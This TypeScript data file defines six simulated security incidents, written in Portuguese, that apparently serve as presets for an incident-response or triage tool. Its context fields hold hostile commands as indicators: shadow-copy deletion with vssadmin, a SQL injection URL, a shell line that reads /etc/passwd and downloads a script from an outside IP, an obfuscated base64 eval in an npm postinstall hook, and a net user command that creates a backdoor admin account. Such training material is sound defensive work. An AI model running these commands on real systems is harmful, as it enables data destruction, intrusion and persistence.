import { IncidentPreset } from "../types";

export const INCIDENT_PRESETS: IncidentPreset[] = [
  {
    id: "preset-ransomware-ad",
    title: "Ransomware Pre-Deployment em Domain Controller",
    badge: "Crítico / Active Directory",
    tipo: "Ransomware / Lateral Movement",
    criticidade: "Crítica",
    descricao: "Alerta EDR detectou execução de 'mimikatz.exe' e 'vssadmin.exe delete shadows /all /quiet' na máquina de um administrador de rede (HOST-ADM-01). Logo em seguida, foi detectada tentativa de conexão via PsExec utilizando credenciais de Domain Admin para o Domain Controller principal (DC01.corp.local). O antivírus local bloqueou parcialmente, mas o serviço VSS foi interrompido.",
    contextoAdicional: `IP Origem: 192.168.10.45 (HOST-ADM-01)
IP Destino: 192.168.1.10 (DC01.corp.local)
Processo Suspeito: C:\\Users\\Public\\mimikatz.exe (SHA256: 8a5d3f2c...89e1)
Linha de Comando: cmd.exe /c vssadmin.exe delete shadows /all /quiet
Conexão Externa Suspeita prévia: 185.220.101.5:443 (Tor Exit Node) iniciada pelo processo powershell.exe -e aQBlAHgA...
Usuário Afetado: CORP\\adm_roberto (Domain Admin)`
  },
  {
    id: "preset-phishing-mfa",
    title: "Spear Phishing com Credential Harvesting e MFA Fatigue",
    badge: "Alta / Identity & M365",
    tipo: "Phishing / Credential Access",
    criticidade: "Alta",
    descricao: "O usuário da diretoria financeira (carlos.silva@empresa.com.br) recebeu um e-mail simulando aviso urgente de expiração de senha do Microsoft 365. Clicou no link e inseriu credenciais. Em seguida, foram disparadas 14 solicitações de push notificatons de MFA em sequência durante a madrugada até o usuário aceitar por fadiga. 10 minutos após o login bem-sucedido, foi criada uma regra de encaminhamento de e-mail oculta (ForwardingRule) enviando todos os e-mails com os termos 'pagamento', 'fatura' e 'swift' para uma conta externa no ProtonMail.",
    contextoAdicional: `Remetente do E-mail: no-reply-security@microsof-verify-portal.net
Link Clicado: hxxps://m365-auth-login.online/login/finance
IP de Origem do Login Suspeito: 193.106.191.22 (Lituânia - VPN NordVPN)
User Agent: Mozilla/5.0 (X11; Linux x86_64)
Regra do Outlook Criada: Name="AutoForward_System", RedirectTo="finance_audit_recovery@proton.me"
Log M365 Audit: Operations "Set-Mailbox", "New-InboxRule", "UserLoggedIn"`
  },
  {
    id: "preset-sqli-webshell",
    title: "SQL Injection e Instalação de Web Shell em Servidor E-Commerce",
    badge: "Crítico / Web Server",
    tipo: "SQL Injection / Web Shell",
    criticidade: "Crítica",
    descricao: "O WAF registrou milhares de requisições com payloads de UNION SELECT no endpoint '/product/view.php?id='. Logo em seguida, os logs de acesso do Apache mostraram uma requisição HTTP POST para '/uploads/avatars/cmd.php' retornando HTTP 200 OK com tamanho de resposta desproporcional. O SIEM gerou um alerta de criação de novos processos cmd.exe oriundos do processo httpd.exe no servidor web corporativo.",
    contextoAdicional: `IP Atacante: 45.154.255.87 (Tor Exit / Hosting)
URL Alvo: https://loja.empresa.com.br/product/view.php?id=1%20UNION%20SELECT%20null,username,password_hash%20FROM%20users
Web Shell Uploaded: /var/www/html/uploads/avatars/cmd.php (SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855)
Linha de Comando Executada: /bin/sh -c "whoami; id; cat /etc/passwd; wget http://185.191.34.12/b.sh -O /tmp/b.sh"`
  },
  {
    id: "preset-cloudtrail-aws",
    title: "Vazamento de Chave AWS IAM e Exfiltração de S3 Bucket",
    badge: "Alta / Cloud Infra",
    tipo: "Cloud Compromise / Data Exfiltration",
    criticidade: "Alta",
    descricao: "O GuardDuty alertou sobre chamadas de API do AWS IAM com a AccessKey 'AKIAIOSFODNN7EXAMPLE' a partir de um endereço IP não reconhecido na Alemanha. A chave pertencia a um desenvolvedor e foi acidentalmente commitada em um repositório público do GitHub há 2 horas. A chave usava chamadas de 's3:GetObject' e 's3:ListBucket' em massa no bucket 'prod-customer-documents-restricted'.",
    contextoAdicional: `AWS AccessKeyId: AKIAIOSFODNN7EXAMPLE
IP Atacante: 185.220.100.240 (Frankfurt - Hetzner Cloud)
User Agent: aws-sdk-python/3.8 (boto3)
Ações Registradas no CloudTrail:
- GetCallerIdentity
- ListBuckets
- ListObjectsV2 (bucket: prod-customer-documents-restricted)
- GetObject (transferidos aproximadamente 42 GB de dados criptografados em 18 minutos)
Nível de acesso da chave: AdministratorAccess (sem condição de Restrição de IP)`
  },
  {
    id: "preset-supplychain-npm",
    title: "Ataque de Supply Chain em Dependência NPM com Reverse Shell",
    badge: "Média / DevOps Pipeline",
    tipo: "Supply Chain Attack",
    criticidade: "Média",
    descricao: "Durante a execução do pipeline de CI/CD da aplicação backend no GitLab Runner, o EDR do servidor de Build gerou um alerta de segurança bloqueando uma conexão de rede de saída iniciada durante o comando 'npm install'. O pacote comprometido 'event-stream-helper' continha um script postinstall com código obfuscado em JavaScript.",
    contextoAdicional: `Pacote Npm Suspeito: event-stream-helper@2.1.4
Script postinstall: node -e "eval(Buffer.from('aW1wb3J0IG5ldCBmcm9tICduZXQnOy...','base64').toString())"
IP Destino TENTADO pelo Runner: 198.51.100.77:8080
SHA256 do pacote: 4f3b2a1c0d9e...
Host afetado: build-runner-03.dev.internal`
  },
  {
    id: "preset-bruteforce-rdp",
    title: "Brute Force RDP Seguido de Criação de Usuário Backdoor",
    badge: "Alta / Windows Infrastructure",
    tipo: "Brute Force / Persistence",
    criticidade: "Alta",
    descricao: "O servidor de arquivos de backup (SRV-BKUP-02) registrou mais de 4.500 falhas de autenticação RDP (Event ID 4625) em um intervalo de 45 minutos vindas de um IP externo. Às 03:14:22, ocorreu um logon bem-sucedido (Event ID 4624 - Logon Type 10) com a conta 'SuporteLocal'. 2 minutos depois, foi registrado o Event ID 4720 (A user account was created) com o nome 'support_sysadmin$' adicionado ao grupo Administrators local.",
    contextoAdicional: `IP de Origem: 103.145.22.8 (Vietnã)
Conta Alvo Comprometida: SuporteLocal
Nova Conta Criada: support_sysadmin$ (Event ID 4720)
Grupo Adicionado: Administrators (Event ID 4728 / 4732)
Comando Executado: net user support_sysadmin$ P@ssw0rd2026! /add && net localgroup administrators support_sysadmin$ /add
Porta RDP Exposta diretamente para a Internet: 3389`
  }
];

export const COMMON_INCIDENT_TYPES = [
  "Ransomware / Malware Infection",
  "Phishing / Credential Harvesting",
  "SQL Injection / Web Exploitation",
  "Lateral Movement / Active Directory Attack",
  "Cloud Compromise / API Key Leakage",
  "Supply Chain Attack",
  "Brute Force / Password Spraying",
  "Data Exfiltration / Insider Threat",
  "DDoS / Service Disruption",
  "Rogue Persistence / Backdoor",
  "Outro / Personalizado"
];
